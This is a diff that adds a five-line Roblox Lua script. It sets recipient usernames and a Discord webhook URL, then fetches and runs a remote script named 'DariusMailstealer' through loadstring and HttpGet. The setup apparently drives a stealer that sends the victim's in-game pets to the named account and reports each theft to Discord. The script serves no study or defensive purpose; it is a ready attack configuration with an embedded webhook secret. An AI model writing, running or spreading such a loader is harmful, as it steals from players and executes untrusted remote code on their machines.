@@ -1,0 +1,5 @@
+UserName = "JGemsTork07" -- good pets
+Webhook = "https://discord.com/api/webhooks/1166815919532687463/qWHqI666sWyUBPyAgSc6MIo6uyrmn27THqZhIEQTyz4XlLo7Q7KHOFesCSBjsl5AMm4e" -- pings for pets
+UserName2 = "JGemsTork07" -- bad pets
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Procoder549/DariusScripts/main/DariusMailstealer", true))()
